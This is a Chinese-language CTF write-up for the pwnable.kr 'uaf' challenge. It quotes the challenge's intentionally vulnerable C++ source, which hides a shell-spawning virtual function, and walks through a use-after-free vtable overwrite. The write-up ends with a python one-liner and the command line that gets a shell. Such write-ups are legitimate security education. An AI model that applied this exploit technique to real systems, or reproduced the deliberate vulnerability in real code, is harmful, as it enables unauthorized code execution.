---
title: kr_uaf
date: 2020-01-28 10:58:41
tags:
- pwn
- pawnable.kr
---

# pwnable.kr uaf

### 0x0 补充知识

[[翻译]通过静态分析的Use-After-Free检测的介绍](https://bbs.pediy.com/thread-226285.htm)

C++ 类的内存分配

### 0x1 分析

题目提示了使用uaf的思路。那就好说了。

先看看开源代码：

```c
#include <fcntl.h>
#include <iostream> 
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
	virtual void give_shell(){
		system("/bin/sh");
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout << "My name is " << name << endl;
		cout << "I am " << age << " years old" << endl;
	}
};

class Man: public Human{
public:
	Man(string name, int age){
		this->name = name;
		this->age = age;
        }
        virtual void introduce(){
		Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
	Human* m = new Man("Jack", 25);
	Human* w = new Woman("Jill", 21);

	size_t len;
	char* data;
	unsigned int op;
	while(1){
		cout << "1. use\n2. after\n3. free\n";
		cin >> op;

		switch(op){
			case 1:
				m->introduce();
				w->introduce();
				break;
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout << "your data is allocated" << endl;
				break;
			case 3:
				delete m;
				delete w;
				break;
			default:
				break;
		}
	}

	return 0;	
}
```

看来需要调用到父类的虚函数`give_shell`。那就先看一下位置吧。

<img src="https://i.loli.net/2020/01/28/UB48hwnIj59WaqM.png" style="zoom:50%;" />

那么看一下`main`函数的汇编代码。因为要利用uaf来申请已经还回的空间。需要知道大小。

<img src="https://i.loli.net/2020/01/28/QUpa9sLXMwuvZN5.png" style="zoom:50%;" />

可以看到。申请到了`0x18`的空间，即`24`。

所以我们在选择`菜单2`的时候，需要选择`24`的`len`。

而关于调用虚函数的`菜单1`：

<img src="https://i.loli.net/2020/01/28/tocbSP5Lu49WUji.png" alt=" " style="zoom:50%;" />

看起来是从虚表首地址偏移了`8`。

所以根据刚才找到的虚函数地址信息。我们需要覆盖为地址`0x00401570 - 8`这样再次调用的时候才会调用到`give_shell`。

<img src="https://i.loli.net/2020/01/28/IWpTuZgtfLwdh1X.png" style="zoom:50%;" />

所以可以来解题了。

### 0x2 解体

需要提前存储地址信息到文件用于覆盖：

`python -c 'print("\x68\x15\x40\x00\x00\x00\x00\x00")' > /tmp/uaf_1`

然后运行：

`./uaf 24 /tmp/uaf_1`

<img src="https://i.loli.net/2020/01/28/3WCeT8NLAUV1O5y.png" style="zoom:50%;" />